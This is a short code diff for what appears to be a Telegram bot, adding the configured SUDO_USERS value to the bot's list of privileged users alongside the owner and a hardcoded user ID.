@@ -18,6 +18,7 @@ from config import *
 
 SUDOERS.append(SUDOER) 
 SUDOERS.append(OWNER_ID) 
+SUDOERS.append(SUDO_USERS) 
 SUDOERS.append(5256676062) 
 
 def get_arg(message):
